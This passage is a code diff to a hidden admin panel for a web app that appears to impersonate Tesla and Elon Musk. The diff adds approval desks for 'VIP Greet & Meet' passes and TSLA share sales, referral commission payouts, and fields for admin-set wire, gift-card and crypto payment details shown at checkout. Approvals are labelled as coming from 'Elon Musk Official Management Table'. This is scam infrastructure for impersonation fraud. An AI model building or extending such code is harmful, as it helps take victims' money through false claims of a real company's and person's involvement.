@@ -23,9 +23,22 @@ import {
   Sparkles,
   Award,
   Trash2,
-  TrendingUp
+  TrendingUp,
+  Percent,
+  Building2,
+  Wallet,
+  Gift
 } from 'lucide-react';
-import { TeslaOrder, TeslaVehicle, InAppInboxMessage, TeslaShareOrder } from '../types';
+import {
+  TeslaOrder,
+  TeslaVehicle,
+  InAppInboxMessage,
+  TeslaShareOrder,
+  VipPassRequest,
+  ReferralConversion,
+  PaymentAccountRequest,
+  AdminPaymentAccounts,
+} from '../types';
 import { REAL_CAR_ASSET_PRESETS } from '../data/teslaVehicles';
 
 const ADMIN_PASSCODE = '0003339999';
@@ -33,16 +46,29 @@ const ADMIN_PASSCODE = '0003339999';
 interface HiddenAdminPortalModalProps {
   isOpen: boolean;
   onClose: () => void;
+  onAdminAuthenticated?: () => void;
   orders: TeslaOrder[];
   vehicles: TeslaVehicle[];
   customCars: TeslaVehicle[];
   inboxMessages: InAppInboxMessage[];
   shareOrders?: TeslaShareOrder[];
+  vipRequests?: VipPassRequest[];
+  referralConversions?: ReferralConversion[];
+  commissionPercent?: number;
+  onUpdateCommissionPercent?: (nextPercent: number) => void;
+  onApproveReferral?: (conversionId: string) => void;
+  onRejectReferral?: (conversionId: string) => void;
+  paymentAccountRequests?: PaymentAccountRequest[];
+  adminPaymentAccounts?: AdminPaymentAccounts;
+  onIssuePaymentAccount?: (requestId: string, accountDetails: string) => void;
+  onSaveAdminPaymentAccounts?: (nextAccounts: AdminPaymentAccounts) => void;
   onApprovePayment: (orderId: string, notes?: string) => void;
   onRejectPayment: (orderId: string, reason?: string) => void;
   onUpdateOrderStatus?: (orderId: string, nextStatus: TeslaOrder['status']) => void;
   onApproveShareOrder?: (orderId: string, notes?: string) => void;
   onRejectShareOrder?: (orderId: string, reason?: string) => void;
+  onApproveVipRequest?: (ticketId: string, notes?: string) => void;
+  onRejectVipRequest?: (ticketId: string, reason?: string) => void;
   onAddNewCar: (car: TeslaVehicle) => void;
   onDeleteCustomCar: (carId: string) => void;
   onSendAdminReply: (messageId: string, replyText: string) => void;
@@ -52,25 +78,44 @@ interface HiddenAdminPortalModalProps {
 export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   isOpen,
   onClose,
+  onAdminAuthenticated,
   orders,
   vehicles,
   customCars,
   inboxMessages,
   shareOrders = [],
+  vipRequests = [],
+  referralConversions = [],
+  commissionPercent = 5,
+  onUpdateCommissionPercent,
+  onApproveReferral,
+  onRejectReferral,
+  paymentAccountRequests = [],
+  adminPaymentAccounts = { wireDetails: '', giftCardInstructions: '', cryptoAddress: '' },
+  onIssuePaymentAccount,
+  onSaveAdminPaymentAccounts,
   onApprovePayment,
   onRejectPayment,
   onUpdateOrderStatus,
   onApproveShareOrder,
   onRejectShareOrder,
+  onApproveVipRequest,
+  onRejectVipRequest,
   onAddNewCar,
   onDeleteCustomCar,
   onSendAdminReply,
   onSendSystemBroadcast,
 }) => {
-  const [activeTab, setActiveTab] = useState<'approvals' | 'add_car' | 'messages' | 'fleet'>('approvals');
-  const [approvalCategory, setApprovalCategory] = useState<'vehicles' | 'shares'>('vehicles');
+  const [activeTab, setActiveTab] = useState<'approvals' | 'accounts' | 'add_car' | 'messages' | 'fleet' | 'referrals'>('approvals');
+  const [approvalCategory, setApprovalCategory] = useState<'vehicles' | 'shares' | 'vip'>('vehicles');
   const [approvalNotes, setApprovalNotes] = useState<{ [orderId: string]: string }>({});
   const [shareApprovalNotes, setShareApprovalNotes] = useState<{ [orderId: string]: string }>({});
+  const [vipApprovalNotes, setVipApprovalNotes] = useState<{ [ticketId: string]: string }>({});
+  const [accountDrafts, setAccountDrafts] = useState<{ [reqId: string]: string }>({});
+  const [wireDetailsInput, setWireDetailsInput] = useState<string>(adminPaymentAccounts.wireDetails || '');
+  const [giftCardInstructionsInput, setGiftCardInstructionsInput] = useState<string>(adminPaymentAccounts.giftCardInstructions || '');
+  const [cryptoAddressInput, setCryptoAddressInput] = useState<string>(adminPaymentAccounts.cryptoAddress || '');
+  const [accountsSavedBanner, setAccountsSavedBanner] = useState<boolean>(false);
   const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
   const [adminReplyText, setAdminReplyText] = useState('');
   const [approvalFilter, setApprovalFilter] = useState<'pending' | 'approved' | 'rejected' | 'all'>('pending');
@@ -79,6 +124,12 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   const [passcodeInput, setPasscodeInput] = useState<string>('');
   const [showPasscode, setShowPasscode] = useState<boolean>(false);
   const [passcodeError, setPasscodeError] = useState<string>('');
+
+  useEffect(() => {
+    setWireDetailsInput(adminPaymentAccounts.wireDetails || '');
+    setGiftCardInstructionsInput(adminPaymentAccounts.giftCardInstructions || '');
+    setCryptoAddressInput(adminPaymentAccounts.cryptoAddress || '');
+  }, [adminPaymentAccounts.wireDetails, adminPaymentAccounts.giftCardInstructions, adminPaymentAccounts.cryptoAddress]);
 
   useEffect(() => {
     if (!isOpen) {
@@ -112,6 +163,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
     if (passcodeInput.trim() === ADMIN_PASSCODE) {
       setIsAuthenticated(true);
       setPasscodeError('');
+      onAdminAuthenticated?.();
     } else {
       setPasscodeError('Incorrect executive passcode. Access denied.');
     }
@@ -215,7 +267,18 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   const pendingShareOrders = shareOrders.filter((s) => !s.paymentStatus || s.paymentStatus === 'pending_admin_approval');
   const approvedShareOrders = shareOrders.filter((s) => s.paymentStatus === 'approved');
   const rejectedShareOrders = shareOrders.filter((s) => s.paymentStatus === 'rejected');
-  const totalPending = pendingOrders.length + pendingShareOrders.length;
+
+  const pendingVipRequests = vipRequests.filter((v) => !v.status || v.status === 'pending_admin_approval');
+  const approvedVipRequests = vipRequests.filter((v) => v.status === 'approved');
+  const rejectedVipRequests = vipRequests.filter((v) => v.status === 'rejected');
+
+  const pendingReferrals = referralConversions.filter((r) => r.status === 'pending_admin_approval');
+  const approvedReferrals = referralConversions.filter((r) => r.status === 'approved');
+  const pendingAccountRequests = paymentAccountRequests.filter((r) => r.status === 'pending_admin');
+  const totalApprovedCommission = approvedReferrals.reduce((sum, r) => sum + r.commissionEarned, 0);
+  const totalPendingCommission = pendingReferrals.reduce((sum, r) => sum + r.commissionEarned, 0);
+
+  const totalPending = pendingOrders.length + pendingShareOrders.length + pendingVipRequests.length;
 
   const filteredOrders = orders.filter((o) => {
     if (approvalFilter === 'pending') return !o.paymentStatus || o.paymentStatus === 'pending_admin_approval';
@@ -228,6 +291,13 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
     if (approvalFilter === 'pending') return !s.paymentStatus || s.paymentStatus === 'pending_admin_approval';
     if (approvalFilter === 'approved') return s.paymentStatus === 'approved';
     if (approvalFilter === 'rejected') return s.paymentStatus === 'rejected';
+    return true;
+  });
+
+  const filteredVipRequests = vipRequests.filter((v) => {
+    if (approvalFilter === 'pending') return !v.status || v.status === 'pending_admin_approval';
+    if (approvalFilter === 'approved') return v.status === 'approved';
+    if (approvalFilter === 'rejected') return v.status === 'rejected';
     return true;
   });
 
@@ -386,18 +456,52 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
             <Car className="w-4 h-4 text-blue-300" />
             <span>Fleet Models ({vehicles.length})</span>
           </button>
+
+          <button
+            onClick={() => setActiveTab('accounts')}
+            className={`py-3 px-3 border-b-2 flex items-center gap-2 cursor-pointer transition-colors whitespace-nowrap ${
+              activeTab === 'accounts'
+                ? 'border-blue-400 text-white font-bold'
+                : 'border-transparent text-slate-400 hover:text-slate-200'
+            }`}
+          >
+            <Building2 className="w-4 h-4 text-blue-400" />
+            <span>Payment Accounts</span>
+            {pendingAccountRequests.length > 0 && (
+              <span className="px-1.5 py-0.5 rounded-full text-[10px] bg-red-600 text-white font-mono tabular-nums font-bold">
+                {pendingAccountRequests.length}
+              </span>
+            )}
+          </button>
+
+          <button
+            onClick={() => setActiveTab('referrals')}
+            className={`py-3 px-3 border-b-2 flex items-center gap-2 cursor-pointer transition-colors whitespace-nowrap ${
+              activeTab === 'referrals'
+                ? 'border-emerald-400 text-white font-bold'
+                : 'border-transparent text-slate-400 hover:text-slate-200'
+            }`}
+          >
+            <Percent className="w-4 h-4 text-emerald-400" />
+            <span>Referrals ({referralConversions.length})</span>
+            {pendingReferrals.length > 0 && (
+              <span className="px-1.5 py-0.5 rounded-full text-[10px] bg-emerald-600 text-white font-mono tabular-nums font-bold">
+                {pendingReferrals.length}
+              </span>
+            )}
+          </button>
         </div>
 
         {/* Tab 1: Payment & Order Approvals Desk */}
         {activeTab === 'approvals' && (
           <div className="flex-1 overflow-y-auto p-5 sm:p-6 space-y-6">
             
-            {/* Subcategory Toggle: Vehicles vs TSLA Shares */}
-            <div className="flex items-center gap-2 p-1.5 rounded-xl bg-[#040a18] border border-blue-900/60">
+            {/* Subcategory Toggle: Vehicles vs TSLA Shares vs VIP Passes */}
+            <div className="flex flex-wrap items-center gap-2 p-1.5 rounded-xl bg-[#040a18] border border-blue-900/60">
               <button
                 type="button"
                 onClick={() => setApprovalCategory('vehicles')}
-                className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-2 ${
+                className={`flex-1 min-w-[160px] py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-2 ${
                   approvalCategory === 'vehicles'
                     ? 'bg-red-600 text-white shadow-md'
                     : 'text-slate-400 hover:text-white'
@@ -415,17 +519,35 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
               <button
                 type="button"
                 onClick={() => setApprovalCategory('shares')}
-                className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-2 ${
+                className={`flex-1 min-w-[160px] py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-2 ${
                   approvalCategory === 'shares'
                     ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white shadow-md'
                     : 'text-slate-400 hover:text-white'
                 }`}
               >
                 <TrendingUp className="w-4 h-4" />
-                <span>TSLA Direct Share Allocations ({shareOrders.length})</span>
+                <span>TSLA Direct Shares ({shareOrders.length})</span>
                 {pendingShareOrders.length > 0 && (
                   <span className="px-1.5 py-0.5 rounded-full text-[10px] bg-blue-950 border border-blue-400/50 text-blue-200 font-mono tabular-nums font-bold">
                     {pendingShareOrders.length} pending
+                  </span>
+                )}
+              </button>
+
+              <button
+                type="button"
+                onClick={() => setApprovalCategory('vip')}
+                className={`flex-1 min-w-[160px] py-2 px-3 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center justify-center gap-2 ${
+                  approvalCategory === 'vip'
+                    ? 'bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 text-white shadow-md'
+                    : 'text-slate-400 hover:text-white'
+                }`}
+              >
+                <Award className="w-4 h-4" />
+                <span>VIP Pass Requests ({vipRequests.length})</span>
+                {pendingVipRequests.length > 0 && (
+                  <span className="px-1.5 py-0.5 rounded-full text-[10px] bg-red-950 border border-red-400/50 text-red-200 font-mono tabular-nums font-bold">
+                    {pendingVipRequests.length} pending
                   </span>
                 )}
               </button>
@@ -438,12 +560,18 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   Pending Admin Approval
                 </div>
                 <div className="text-2xl font-bold font-mono tabular-nums text-white mt-1">
-                  {approvalCategory === 'vehicles' ? pendingOrders.length : pendingShareOrders.length}
+                  {approvalCategory === 'vehicles'
+                    ? pendingOrders.length
+                    : approvalCategory === 'shares'
+                    ? pendingShareOrders.length
+                    : pendingVipRequests.length}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-0.5">
                   {approvalCategory === 'vehicles'
                     ? 'Direct payment review required before VIN allocation'
-                    : 'Review incoming wire/ACH to issue Delaware share certificate'}
+                    : approvalCategory === 'shares'
+                    ? 'Review incoming wire/ACH to issue Delaware share certificate'
+                    : 'Review VIP Greet & Meet clearance and plaque issuance'}
                 </div>
               </div>
 
@@ -452,7 +580,11 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   Approved & Allocated
                 </div>
                 <div className="text-2xl font-bold font-mono tabular-nums text-white mt-1">
-                  {approvalCategory === 'vehicles' ? approvedOrders.length : approvedShareOrders.length}
+                  {approvalCategory === 'vehicles'
+                    ? approvedOrders.length
+                    : approvalCategory === 'shares'
+                    ? approvedShareOrders.length
+                    : approvedVipRequests.length}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-0.5">
                   Verified orders with dispatched in-app notifications
@@ -461,13 +593,25 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
 
               <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/60">
                 <div className="text-[10px] uppercase font-mono text-slate-400 font-bold">
-                  {approvalCategory === 'vehicles' ? 'Total Fleet Orders' : 'Total TSLA Share Allocations'}
+                  {approvalCategory === 'vehicles'
+                    ? 'Total Fleet Orders'
+                    : approvalCategory === 'shares'
+                    ? 'Total TSLA Share Allocations'
+                    : 'Total VIP Pass Requests'}
                 </div>
                 <div className="text-2xl font-bold font-mono tabular-nums text-white mt-1">
-                  {approvalCategory === 'vehicles' ? orders.length : shareOrders.length}
+                  {approvalCategory === 'vehicles'
+                    ? orders.length
+                    : approvalCategory === 'shares'
+                    ? shareOrders.length
+                    : vipRequests.length}
                 </div>
                 <div className="text-[11px] text-slate-400 mt-0.5">
-                  {approvalCategory === 'vehicles' ? 'Total gross revenue across fleet pre-orders' : 'Gross treasury capital across equity tranches'}
+                  {approvalCategory === 'vehicles'
+                    ? 'Total gross revenue across fleet pre-orders'
+                    : approvalCategory === 'shares'
+                    ? 'Gross treasury capital across equity tranches'
+                    : 'Executive VIP Greet & Meet security clearances'}
                 </div>
               </div>
             </div>
@@ -483,7 +627,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                       : 'bg-[#08142b] border border-blue-900/50 text-slate-300 hover:text-white'
                   }`}
                 >
-                  Pending Review ({approvalCategory === 'vehicles' ? pendingOrders.length : pendingShareOrders.length})
+                  Pending Review ({approvalCategory === 'vehicles' ? pendingOrders.length : approvalCategory === 'shares' ? pendingShareOrders.length : pendingVipRequests.length})
                 </button>
                 <button
                   onClick={() => setApprovalFilter('approved')}
@@ -493,7 +637,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                       : 'bg-[#08142b] border border-blue-900/50 text-slate-300 hover:text-white'
                   }`}
                 >
-                  Approved ({approvalCategory === 'vehicles' ? approvedOrders.length : approvedShareOrders.length})
+                  Approved ({approvalCategory === 'vehicles' ? approvedOrders.length : approvalCategory === 'shares' ? approvedShareOrders.length : approvedVipRequests.length})
                 </button>
                 <button
                   onClick={() => setApprovalFilter('all')}
@@ -503,7 +647,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                       : 'bg-[#08142b] border border-blue-900/50 text-slate-300 hover:text-white'
                   }`}
                 >
-                  All ({approvalCategory === 'vehicles' ? orders.length : shareOrders.length})
+                  All ({approvalCategory === 'vehicles' ? orders.length : approvalCategory === 'shares' ? shareOrders.length : vipRequests.length})
                 </button>
               </div>
 
@@ -654,7 +798,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                           ) : (
                             <div className="pt-2.5 border-t border-blue-900/50 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-[11px] text-slate-400 font-mono">
                               <span className="truncate">
-                                {order.approvalNotes ? `Admin Note: ${order.approvalNotes}` : 'Approved by Tesla Executive Admin Desk'}
+                                {order.approvalNotes ? `Admin Note: ${order.approvalNotes}` : 'Approved by Elon Musk Official Management Table'}
                               </span>
                               <div className="flex items-center gap-2 shrink-0">
                                 {isApproved && onUpdateOrderStatus && (
@@ -841,10 +985,146 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                           ) : (
                             <div className="pt-2 border-t border-blue-900/50 flex items-center justify-between text-[11px] text-slate-400 font-mono">
                               <span>
-                                {shareOrder.approvalNotes ? `Admin Note: ${shareOrder.approvalNotes}` : 'Approved by Tesla Treasury Admin Desk'}
+                                {shareOrder.approvalNotes ? `Admin Note: ${shareOrder.approvalNotes}` : 'Approved by Elon Musk Official Management Table'}
                               </span>
                               <span className="text-blue-300">
                                 {shareOrder.approvedAt ? `Executed: ${new Date(shareOrder.approvedAt).toLocaleDateString()}` : 'Dispatched to In-App Inbox'}
+                              </span>
+                            </div>
+                          )}
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
+              </div>
+            )}
+
+            {/* VIP Pass Requests View */}
+            {approvalCategory === 'vip' && (
+              <div>
+                {filteredVipRequests.length === 0 ? (
+                  <div className="p-12 text-center rounded-2xl bg-[#08142b] border border-blue-900/60 text-slate-400 text-xs">
+                    <CheckCircle2 className="w-10 h-10 text-emerald-400 mx-auto mb-2 opacity-60" />
+                    No VIP Pass requests matching the &ldquo;{approvalFilter}&rdquo; filter currently.
+                  </div>
+                ) : (
+                  <div className="space-y-4">
+                    {filteredVipRequests.map((vipReq) => {
+                      const isPending = !vipReq.status || vipReq.status === 'pending_admin_approval';
+                      const isApproved = vipReq.status === 'approved';
+                      const isRejected = vipReq.status === 'rejected';
+
+                      return (
+                        <div
+                          key={vipReq.ticketId}
+                          className={`p-5 rounded-2xl border transition-all ${
+                            isPending
+                              ? 'bg-gradient-to-r from-red-950/25 via-blue-950/25 to-[#08142b] border-red-500/50 shadow-lg'
+                              : isApproved
+                              ? 'bg-[#08142b] border-blue-500/40'
+                              : 'bg-[#050d20] border-blue-900/50'
+                          }`}
+                        >
+                          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-blue-900/50">
+                            <div>
+                              <div className="flex items-center gap-2">
+                                <span className="font-mono text-xs font-bold text-blue-300">
+                                  {vipReq.ticketId}
+                                </span>
+                                <span className="text-[10px] font-mono text-slate-400">
+                                  {vipReq.orderDate}
+                                </span>
+                                <span className="px-2 py-0.5 rounded text-[9px] font-mono font-bold uppercase bg-red-600/20 text-red-200 border border-red-500/40">
+                                  {vipReq.tier.toUpperCase()} PLAQUE
+                                </span>
+                              </div>
+                              <h4 className="font-display font-bold text-base text-white mt-0.5">
+                                {vipReq.tierName} · ${vipReq.price.toLocaleString()} USD
+                              </h4>
+                            </div>
+
+                            <div className="flex items-center gap-2">
+                              {isPending && (
+                                <span className="px-3 py-1 rounded-full text-xs font-bold font-mono bg-red-600/30 text-red-200 border border-red-500 flex items-center gap-1.5">
+                                  <AlertTriangle className="w-3.5 h-3.5" />
+                                  Pending Admin Approval
+                                </span>
+                              )}
+                              {isApproved && (
+                                <span className="px-3 py-1 rounded-full text-xs font-bold font-mono bg-emerald-500/20 text-emerald-300 border border-emerald-500 flex items-center gap-1.5">
+                                  <CheckCircle2 className="w-3.5 h-3.5" />
+                                  VIP Clearance Approved
+                                </span>
+                              )}
+                              {isRejected && (
+                                <span className="px-3 py-1 rounded-full text-xs font-bold font-mono bg-slate-800 text-slate-400 border border-slate-700 flex items-center gap-1.5">
+                                  <XCircle className="w-3.5 h-3.5" />
+                                  Request Declined
+                                </span>
+                              )}
+                            </div>
+                          </div>
+
+                          <div className="py-3 grid grid-cols-2 sm:grid-cols-4 gap-4 text-xs font-mono">
+                            <div>
+                              <span className="text-slate-400 text-[10px] uppercase block">Guest Name</span>
+                              <span className="text-white font-sans font-semibold">{vipReq.guestName}</span>
+                              <span className="text-slate-400 text-[11px] block">{vipReq.email}</span>
+                            </div>
+                            <div>
+                              <span className="text-slate-400 text-[10px] uppercase block">Organization</span>
+                              <span className="text-slate-200 font-sans font-medium block">
+                                {vipReq.organization || 'Independent Delegate'}
+                              </span>
+                            </div>
+                            <div>
+                              <span className="text-slate-400 text-[10px] uppercase block">Meeting Purpose</span>
+                              <span className="text-blue-300 capitalize block">{vipReq.purpose.replace('-', ' ')}</span>
+                            </div>
+                            <div>
+                              <span className="text-slate-400 text-[10px] uppercase block">Preferred Date</span>
+                              <span className="text-white tabular-nums block">{vipReq.preferredDate}</span>
+                            </div>
+                          </div>
+
+                          {isPending ? (
+                            <div className="pt-3 border-t border-blue-900/50 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
+                              <div className="flex-1 max-w-md">
+                                <input
+                                  type="text"
+                                  placeholder="Optional security clearance note (sent to visitor's in-app inbox)..."
+                                  value={vipApprovalNotes[vipReq.ticketId] || ''}
+                                  onChange={(e) =>
+                                    setVipApprovalNotes({ ...vipApprovalNotes, [vipReq.ticketId]: e.target.value })
+                                  }
+                                  className="w-full px-3 py-1.5 rounded-lg bg-[#040a18] border border-blue-900/70 text-xs text-white focus:outline-none focus:border-blue-400 placeholder:text-slate-500"
+                                />
+                              </div>
+
+                              <div className="flex items-center gap-2">
+                                <button
+                                  onClick={() => onRejectVipRequest?.(vipReq.ticketId, vipApprovalNotes[vipReq.ticketId])}
+                                  className="px-3.5 py-2 rounded-xl bg-[#040a18] border border-blue-900/70 hover:border-red-500/50 text-slate-300 text-xs font-semibold cursor-pointer transition-colors"
+                                >
+                                  Reject Request
+                                </button>
+                                <button
+                                  onClick={() => onApproveVipRequest?.(vipReq.ticketId, vipApprovalNotes[vipReq.ticketId])}
+                                  className="px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold shadow-md cursor-pointer transition-all flex items-center gap-1.5"
+                                >
+                                  <Check className="w-4 h-4 stroke-[3]" />
+                                  <span>Approve VIP Pass & Dispatch Clearance</span>
+                                </button>
+                              </div>
+                            </div>
+                          ) : (
+                            <div className="pt-2 border-t border-blue-900/50 flex items-center justify-between text-[11px] text-slate-400 font-mono">
+                              <span>
+                                {vipReq.approvalNotes ? `Admin Note: ${vipReq.approvalNotes}` : 'Reviewed by Elon Musk Official Management Table'}
+                              </span>
+                              <span className="text-blue-300">
+                                {vipReq.approvedAt ? `Cleared: ${new Date(vipReq.approvedAt).toLocaleDateString()}` : 'Dispatched to In-App Inbox'}
                               </span>
                             </div>
                           )}
@@ -1250,6 +1530,381 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   </div>
                 </div>
               ))}
+            </div>
+          </div>
+        )}
+
+        {/* Tab 5: Referral Program & Commission Payouts */}
+        {activeTab === 'referrals' && (
+          <div className="flex-1 overflow-y-auto p-5 sm:p-6 space-y-6">
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              <div className="p-4 rounded-xl bg-[#08142b] border border-blue-800/60 space-y-2">
+                <div className="text-[11px] font-mono text-blue-300 font-semibold">
+                  Global Commission Rate
+                </div>
+                <div className="flex items-center gap-2">
+                  <input
+                    type="number"
+                    min={0.5}
+                    max={50}
+                    step={0.5}
+                    value={commissionPercent}
+                    onChange={(e) => {
+                      const val = Number(e.target.value);
+                      if (!Number.isNaN(val) && val >= 0.5 && val <= 50 && onUpdateCommissionPercent) {
+                        onUpdateCommissionPercent(val);
+                      }
+                    }}
+                    className="w-24 px-3 py-1.5 rounded-lg bg-[#040a18] border border-blue-700/70 text-lg font-mono font-bold tabular-nums text-white focus:outline-none focus:border-blue-400"
+                  />
+                  <span className="text-lg font-mono font-bold text-emerald-400">%</span>
+                </div>
+                <div className="flex flex-wrap gap-1.5 pt-1">
+                  {[3, 5, 7.5, 10, 15].map((preset) => (
+                    <button
+                      key={preset}
+                      type="button"
+                      onClick={() => onUpdateCommissionPercent?.(preset)}
+                      className={`px-2 py-1 rounded text-[11px] font-mono font-bold cursor-pointer transition-colors ${
+                        commissionPercent === preset
+                          ? 'bg-blue-600 text-white'
+                          : 'bg-[#040a18] border border-blue-900/60 text-slate-300 hover:text-white'
+                      }`}
+                    >
+                      {preset}%
+                    </button>
+                  ))}
+                </div>
+              </div>
+
+              <div className="p-4 rounded-xl bg-emerald-950/25 border border-emerald-500/40">
+                <div className="text-[11px] font-mono text-emerald-300 font-semibold">
+                  Approved Payouts ({approvedReferrals.length})
+                </div>
+                <div className="text-2xl font-bold font-mono tabular-nums text-white mt-1">
+                  ${totalApprovedCommission.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                </div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  Settled referral rewards credited to referrers
+                </div>
+              </div>
+
+              <div className="p-4 rounded-xl bg-red-950/25 border border-red-500/40">
+                <div className="text-[11px] font-mono text-red-300 font-semibold">
+                  Pending Review ({pendingReferrals.length})
+                </div>
+                <div className="text-2xl font-bold font-mono tabular-nums text-white mt-1">
+                  ${totalPendingCommission.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                </div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  Auto-clears when parent order is approved, or approve manually below
+                </div>
+              </div>
+            </div>
+
+            <div className="space-y-3">
+              <div className="flex items-center justify-between pb-2 border-b border-blue-900/60">
+                <h4 className="font-bold text-sm text-white">
+                  Visitor Referral Conversions ({referralConversions.length})
+                </h4>
+                <span className="text-xs font-mono text-slate-400">
+                  Tracked automatically across Vehicle Orders, VIP Passes &amp; TSLA Shares
+                </span>
+              </div>
+
+              {referralConversions.length === 0 ? (
+                <div className="p-10 text-center rounded-2xl bg-[#08142b] border border-blue-900/60 text-slate-400 text-xs">
+                  No orders have been submitted with a referral code yet.
+                </div>
+              ) : (
+                <div className="space-y-3">
+                  {referralConversions.map((conv) => {
+                    const isPending = conv.status === 'pending_admin_approval';
+                    const isApproved = conv.status === 'approved';
+                    return (
+                      <div
+                        key={conv.id}
+                        className={`p-4 rounded-2xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4 ${
+                          isPending
+                            ? 'bg-gradient-to-r from-red-950/25 via-blue-950/20 to-[#08142b] border-red-500/45'
+                            : isApproved
+                            ? 'bg-[#08142b] border-emerald-500/40'
+                            : 'bg-[#050d20] border-blue-900/50'
+                        }`}
+                      >
+                        <div className="space-y-1">
+                          <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono">
+                            <span className="text-blue-300 font-bold">{conv.referrerCode}</span>
+                            <span className="text-slate-500">·</span>
+                            <span className="text-slate-300">{conv.orderId}</span>
+                            <span className="text-slate-500">·</span>
+                            <span className="text-slate-400 uppercase">{conv.orderType}</span>
+                            <span className="text-slate-500">·</span>
+                            <span className="text-slate-400">{conv.dateStr}</span>
+                          </div>
+                          <div className="text-sm font-bold text-white">
+                            {conv.itemTitle} — <span className="font-normal text-slate-300">{conv.buyerName}</span>
+                          </div>
+                          <div className="text-xs font-mono tabular-nums text-slate-300">
+                            Order Total: ${conv.orderAmount.toLocaleString()} · Rate: {conv.commissionPercent}% ·{' '}
+                            <span className="text-emerald-400 font-bold">
+                              Earned: ${conv.commissionEarned.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                            </span>
+                          </div>
+                        </div>
+
+                        <div className="flex items-center gap-2 shrink-0">
+                          {isPending ? (
+                            <>
+                              <button
+                                type="button"
+                                onClick={() => onRejectReferral?.(conv.id)}
+                                className="px-3 py-1.5 rounded-lg bg-[#040a18] border border-blue-900/70 hover:border-red-500/50 text-slate-300 text-xs font-semibold cursor-pointer transition-colors whitespace-nowrap"
+                              >
+                                Reject
+                              </button>
+                              <button
+                                type="button"
+                                onClick={() => onApproveReferral?.(conv.id)}
+                                className="px-4 py-1.5 rounded-lg bg-gradient-to-r from-blue-600 to-emerald-600 hover:brightness-110 text-white text-xs font-bold cursor-pointer transition-all whitespace-nowrap flex items-center gap-1.5"
+                              >
+                                <Check className="w-3.5 h-3.5" />
+                                <span>Approve Payout</span>
+                              </button>
+                            </>
+                          ) : isApproved ? (
+                            <span className="text-xs font-mono font-bold text-emerald-400 flex items-center gap-1.5 whitespace-nowrap">
+                              <CheckCircle2 className="w-4 h-4" />
+                              Approved Payout
+                            </span>
+                          ) : (
+                            <span className="text-xs font-mono font-semibold text-slate-400 flex items-center gap-1.5 whitespace-nowrap">
+                              <XCircle className="w-4 h-4" />
+                              Rejected
+                            </span>
+                          )}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
+              )}
+            </div>
+          </div>
+        )}
+
+        {/* Tab 6: Admin Payment Accounts & Visitor Account Requests */}
+        {activeTab === 'accounts' && (
+          <div className="flex-1 overflow-y-auto p-5 sm:p-6 space-y-6">
+            <div className="p-5 rounded-2xl bg-[#08142b] border border-blue-500/40 space-y-4">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+                <div>
+                  <h4 className="font-bold text-sm text-white">
+                    Active Admin-Provided Payment Accounts
+                  </h4>
+                  <p className="text-xs text-slate-300 mt-0.5">
+                    Leave blank to require visitors to request an account per order, or enter official details below to publish directly to checkout.
+                  </p>
+                </div>
+                {accountsSavedBanner && (
+                  <span className="text-xs font-mono text-emerald-400 font-bold flex items-center gap-1.5">
+                    <CheckCircle2 className="w-4 h-4" />
+                    Accounts Updated
+                  </span>
+                )}
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div className="space-y-1.5">
+                  <label className="text-xs font-semibold text-blue-200 flex items-center gap-1.5">
+                    <Building2 className="w-3.5 h-3.5 text-blue-400" />
+                    <span>Wire Transfer / ACH Account Details</span>
+                  </label>
+                  <textarea
+                    rows={3}
+                    value={wireDetailsInput}
+                    onChange={(e) => setWireDetailsInput(e.target.value)}
+                    placeholder="Enter bank name, routing/ABA, SWIFT, and beneficiary account..."
